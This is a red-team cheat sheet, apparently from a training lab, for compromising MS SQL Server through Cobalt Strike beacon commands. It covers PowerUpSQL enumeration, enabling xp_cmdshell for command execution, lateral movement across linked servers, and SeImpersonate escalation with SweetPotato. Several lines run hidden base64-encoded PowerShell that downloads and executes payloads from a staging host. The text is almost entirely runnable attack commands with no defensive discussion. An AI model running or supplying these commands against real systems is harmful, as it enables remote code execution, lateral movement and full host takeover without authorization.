# MSSQL Servers

# Use PowerUpSQL for enumerating MS SQL Server instances

    beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
    beacon> powerpick Get-SQLInstanceDomain

# Check access to DB instance with current user session

    beacon> powerpick Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
    beacon> powerpick Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
    beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Query execution

    beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

# Command Execution

    beacon> powerpick Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

# Interactive access and RCE (xp_cmdshell 0 means it is disabled, needs to be enabled)

    ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25 -debug

    SQL> EXEC xp_cmdshell 'whoami';
    SQL> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
    SQL> sp_configure 'Show Advanced Options', 1; RECONFIGURE;
    SQL> sp_configure 'xp_cmdshell', 1; RECONFIGURE;

    SQL> EXEC xp_cmdshell 'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBwAGkAdgBvAHQAIgApAA==';

# Lateral Movement (using DB Links)

    beacon> powerpick Get-SQLServerLink -Instance "sql-2.dev.cyberbotic.io,1433"
    beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
    beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433" -Query "exec master..xp_cmdshell 'whoami'"

    SQL> SELECT * FROM master..sysservers;
    SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
    SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');

    SQL> EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
    SQL> EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

    SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=''')

# MSSQL PrivEsc - Service Account (SeImpersonate) to System 

    beacon> getuid
    beacon> shell whoami /priv
    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

    beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHQAYwBwAC0AbABvAGMAYQBsACIAKQA="

    beacon> connect localhost 4444
